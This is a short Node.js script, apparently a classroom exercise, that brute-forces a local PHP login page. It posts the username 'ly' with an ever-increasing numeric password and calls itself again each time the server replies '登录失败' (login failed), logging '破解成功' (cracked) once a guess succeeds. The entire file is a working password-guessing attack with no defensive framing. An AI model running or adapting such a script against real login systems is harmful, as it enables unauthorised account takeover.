var request = require("request");
/*000000000
999999999*/
var password = 0;

function hack() {
	request.post({
		url: 'http://localhost:88/cs1701/nodejs/day2/login.php',
		formData: {
			username: "ly",
			password: password++
		}
	}, function optionalCallback(err, httpResponse, body) {
		if(err) {
			return console.error('upload failed:', err);
		}
		console.log('Upload successful!  Server responded with:', body);
		if(body == "登录失败") {
			console.log("继续破解", password)
			hack();
		} else {
			console.log("破解成功", password--)
			return;
		}
	});
}
hack()